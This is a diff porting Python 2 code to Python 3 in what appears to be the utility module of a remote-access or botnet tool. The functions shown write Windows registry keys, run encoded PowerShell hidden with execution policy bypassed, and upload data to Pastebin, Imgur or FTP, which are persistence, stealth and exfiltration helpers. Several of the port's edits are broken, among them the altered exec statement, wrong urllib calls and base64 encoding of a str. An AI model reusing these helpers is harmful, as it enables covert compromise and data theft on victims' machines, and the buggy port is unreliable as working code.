@@ -11,7 +11,7 @@ def log(info, level='debug'):
 
     """
     import logging
-    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handler=logging.StreamHandler())
+    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
@@ -36,7 +36,7 @@ def imports(source, target=None):
         module = globals()
     for src in source:
         try:
-            exec "import {}".format(src) in target
+            exec ("import {}".format(src) in target)
         except ImportError:
             log("missing package '{}' is required".format(source))
 
@@ -69,7 +69,7 @@ def public_ip():
 
     """
     import urllib
-    return urllib.urlopen('http://api.ipify.org').read()
+    return urllib.request.urlopen('http://api.ipify.org').read().decode('utf-8')
 
 def local_ip():
     """ 
@@ -177,12 +177,12 @@ def post(url, headers={}, data={}, as_json=False):
         return output
     except ImportError:
         import urllib
-        import urllib2
-        data = urllib.urlencode(data)
-        req  = urllib2.Request(str(url), data=data)
+        import urllib
+        data = urllib.parse.urlencode(data)
+        req  = urllib.request.Request(str(url), data=data)
         for key, value in headers.items():
             req.headers[key] = value
-        output = urllib2.urlopen(req).read()
+        output = urllib.request.urlopen(req).read()
         if as_json:
             import json
             try:
@@ -223,10 +223,10 @@ def registry_key(key, subkey, value):
 
     """
     try:
-        import _winreg
-        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
-        _winreg.CloseKey(reg_key)
+        import winreg
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(reg_key, subkey, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(reg_key)
         return True
     except Exception as e:
         log(e)
@@ -245,7 +245,7 @@ def png(image):
     import zlib
     import numpy
     import struct
-    import StringIO
+    from io import BytesIO
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
         data = image.tobytes()
@@ -268,7 +268,7 @@ def png(image):
     iend = [b"", b'IEND', b"", b""]
     iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
     iend[0] = struct.pack('>I', len(iend[2]))
-    fileh = StringIO.StringIO()
+    fileh = BytesIO()
     fileh.write(magic)
     fileh.write(b"".join(ihdr))
     fileh.write(b"".join(idat))
@@ -340,7 +340,7 @@ def powershell(code):
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
     except Exception as e:
-        log("{} error: {}".format(powershell.func_name, str(e)))
+        log("{} error: {}".format(powershell.__name__, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """ 
@@ -377,7 +377,7 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.func_name, str(e)))
+        log("{} error: {}".format(color.__name__, str(e)))
 
 def imgur(source, api_key=None):
     """ 
@@ -403,13 +403,13 @@ def pastebin(source, api_key):
     :param str api_user_key:   Pastebin api_user_key
 
     """
-    import urllib2
+    import urllib
     if isinstance(api_key, str):
         try:
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
-            parts = urllib2.urlparse.urlsplit(paste)       
-            return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            parts = urllib.urlparse.urlsplit(paste)       
+            return urllib.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
         except Exception as e:
             log("Upload to Pastebin failed with error: {}".format(e))
     else:
@@ -432,7 +432,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import os
     import time
     import ftplib
-    import StringIO
+    from io import StringIO
     if host and user and password:
         path  = ''
         local = time.ctime().split()
@@ -442,7 +442,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         elif hasattr(source, 'seek'):
             source.seek(0)
         else:
-            source = StringIO.StringIO(source)
+            source = StringIO(source)
         try:
             ftp = ftplib.FTP(host=host, user=user, password=password)
         except:
